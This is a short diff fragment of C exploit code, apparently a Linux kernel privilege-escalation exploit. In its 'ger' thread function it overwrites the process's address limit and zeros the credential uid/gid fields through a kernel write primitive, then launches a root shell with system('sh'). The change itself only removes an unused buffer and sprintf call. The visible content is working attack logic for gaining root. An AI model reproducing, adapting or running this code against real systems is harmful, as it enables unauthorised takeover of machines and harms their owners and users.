@@ -102,7 +102,6 @@ ssize_t write_kern(void *readbuf, void *writebuf, size_t count) {
 void *ger(void *arg){
 	int sem_id;
 	void *task_struct,*cred;
-	char buf[256];
 	const char new_addr_limit[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
 	const char new_egideuid[] = {0,0,0,0};
 	printf("ger thread\n");
@@ -137,8 +136,7 @@ void *ger(void *arg){
 	write_kern((void *)(cred+24), (void*)&new_egideuid, 4);
 
 	if(geteuid() != 0) printf("not root :(\n");
-	sprintf(buf,"sh",WAITER_OVERWRITE_OFFSET);
-	system(buf);
+	system("sh");
 	
 	printf("ger function exiting. your OS will lose it like Brazil\n");
 	return NULL;
